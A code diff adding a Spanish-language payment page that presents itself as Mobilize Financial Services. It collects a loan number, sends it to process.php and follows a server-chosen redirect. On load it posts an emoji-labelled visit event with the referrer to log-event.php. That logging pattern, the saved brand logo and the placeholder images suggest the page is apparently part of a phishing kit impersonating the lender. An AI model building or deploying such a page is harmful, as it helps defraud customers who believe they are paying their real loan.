@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Pagos en línea - Mobilize Financial Services</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Realiza pagos en línea de forma segura y rápida con Mobilize Financial Services.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/styles.css">
+</head>
+<body>
+
+<div class="page-column">
+
+<header>
+  <img class="site-logo" src="assets/images/download.svg" alt="Mobilize Financial Services">
+</header>
+
+<div class="payment-zone-wrapper">
+  <div class="payment-zone">
+    <div class="card">
+      <div class="loading-overlay" id="loadingOverlay">
+        <img src="assets/images/loader.gif" alt="Cargando..." class="loader-gif">
+      </div>
+
+      <main class="form-search-credit">
+        <h3>Ingresa el número de tu crédito para realizar el pago de tu obligación</h3>
+
+        <form id="creditForm" novalidate>
+          <div class="field" id="creditField">
+            <label for="creditNumber">Número de crédito <span class="required">*</span></label>
+            <input type="text" id="creditNumber" name="creditNumber" inputmode="numeric" autocomplete="off" required>
+          </div>
+          <p class="error-message" id="errorMessage"></p>
+
+          <div class="actions">
+            <button type="button" class="btn-back" onclick="history.back()">Regresar</button>
+            <button type="button" class="btn-continue" id="submit-button" disabled>Continuar</button>
+          </div>
+        </form>
+      </main>
+    </div>
+  </div>
+</div>
+
+<section class="legal-text">
+  <p>
+    Todos los pagos serán aplicados según el horario bancario definido por la Entidad.
+    De realizarse el pago fuera de este horario, éste será aplicado al siguiente día
+    hábil bancario de conformidad con el Artículo 97 del Decreto 663 de 1993
+    (Estatuto Orgánico del Sistema Financiero).
+  </p>
+  <p>
+    Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto,
+    éste será aplicado a capital bajo la modalidad de reducir el plazo. En caso de que
+    desees que dicho abono sea abonado a capital bajo la modalidad de reducir cuota,
+    una vez realices el pago deberás informar a la Entidad escribiendo al correo
+    electrónico <a href="mailto:clientes@mobilize-fs.com">clientes@mobilize-fs.com</a>
+    o comunicándote con nuestras líneas de atención.
+  </p>
+  <p>
+    Si posees más de un crédito, es necesario realizar una transacción por cada uno.
+  </p>
+  <p>
+    Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras
+    líneas de atención.
+  </p>
+</section>
+
+<footer>
+  <img src="./assets/images/prueba-4.png" alt="Imagen ilustrativa" class="mobile-hidden" onerror="this.style.display='none'">
+</footer>
+
+</div>
+
+<script>
+  const input = document.getElementById('creditNumber');
+  const field = document.getElementById('creditField');
+  const continueBtn = document.getElementById('submit-button');
+  const errorMessage = document.getElementById('errorMessage');
+  const loadingOverlay = document.getElementById('loadingOverlay');
+
+  fetch('log-event.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      event: '🟢 Entrada al portal de pagos',
+      data: { 'Referrer': document.referrer || 'directo' }
+    })
+  }).catch(() => {});
+
+  function clearError() {
+    errorMessage.textContent = '';
+    errorMessage.classList.remove('visible');
+    field.classList.remove('field-error');
+  }
+
+  function showError(message) {
+    errorMessage.textContent = message;
+    errorMessage.classList.add('visible');
+    field.classList.add('field-error');
+  }
+
+  input.addEventListener('input', () => {
+    const hasValue = input.value.trim().length > 0;
+    continueBtn.disabled = !hasValue;
+    continueBtn.classList.toggle('active', hasValue);
+    clearError();
+  });
+
+  continueBtn.addEventListener('click', async () => {
+    const creditNumber = input.value.trim();
+    if (!creditNumber || continueBtn.disabled) return;
+
+    clearError();
+    continueBtn.disabled = true;
+    loadingOverlay.classList.add('visible');
+
+    try {
+      const response = await fetch('process.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'creditNumber=' + encodeURIComponent(creditNumber)
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        window.location.href = data.redirect;
+        return;
+      }
+
+      showError(data.message || 'No encontramos información asociada a ese número de crédito.');
+    } catch (err) {
+      showError('Error de conexión con el servicio. Inténtalo de nuevo.');
+    } finally {
+      continueBtn.disabled = false;
+      loadingOverlay.classList.remove('visible');
+      continueBtn.classList.add('active');
+    }
+  });
+</script>
+
+</body>
+</html>
